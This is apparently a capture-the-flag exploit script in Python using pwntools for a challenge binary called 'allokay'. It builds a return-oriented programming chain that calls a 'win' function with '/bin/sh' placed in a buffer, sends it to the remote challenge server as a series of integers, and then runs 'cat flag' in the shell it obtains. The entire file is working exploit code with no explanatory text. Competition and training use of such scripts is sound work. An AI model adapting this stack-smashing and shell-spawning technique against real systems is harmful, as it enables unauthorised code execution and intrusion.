#!/usr/bin/env python3

from pwn import *
context.arch = 'amd64'

elf = ELF('allokay')

rop = ROP(elf)
rop.call(elf.symbols.win, [elf.symbols.buffer + 3])
payload = rop.chain()

c = remote('chals.damctf.xyz', 32575)
c.sendline(b'14 /bin/sh\x00')
c.sendline('- ' * 11)

for num in group(8, payload):
    c.sendline(str(u64(num, sign=True)))

c.recvline()
c.clean()
c.sendline('cat flag; exit')
log.success(c.readall())
